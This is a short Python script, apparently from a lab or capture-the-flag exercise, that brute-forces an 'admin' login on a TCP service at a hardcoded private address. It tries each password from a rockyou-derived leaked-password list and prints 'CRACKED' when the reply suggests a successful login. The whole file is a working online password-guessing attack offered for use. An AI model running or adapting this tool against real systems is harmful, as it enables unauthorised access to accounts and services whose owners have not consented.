import socket;import sys
def pwn(rHost, rPort, wl):
    try:
        with open(wl, 'r', encoding='latin-1') as f:
            for line in f:
                password = line.strip()
                try:
                    cS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    cS.settimeout(1)
                    print(f"[!] Attempting {str(password)}")
                    cS.connect((rHost, rPort))
                    cS.sendall(b"admin\n")
                    cS.recv(1024)
                    cS.sendall(f"{password}\n".encode())
                    response = cS.recv(1024).decode(errors='ignore')
                    print(f"[*] {str(rHost)}:{str(rPort)} -- ({str(password)}) // {str(response)}",end="\r")
                    if "Welcome" in response or "root" in response or "Admin" in response:
                        print(f"\n[+] CRACKED: {password}");sys.exit(0)
                    cS.close()
                except Exception: continue
    except FileNotFoundError: print("[-] Wordlist not found.")

if __name__ == "__main__": pwn("10.67.130.81", 8000, "/home/jackalsyn/opt/SecLists/Passwords/Leaked-Databases/rockyou-70.txt")
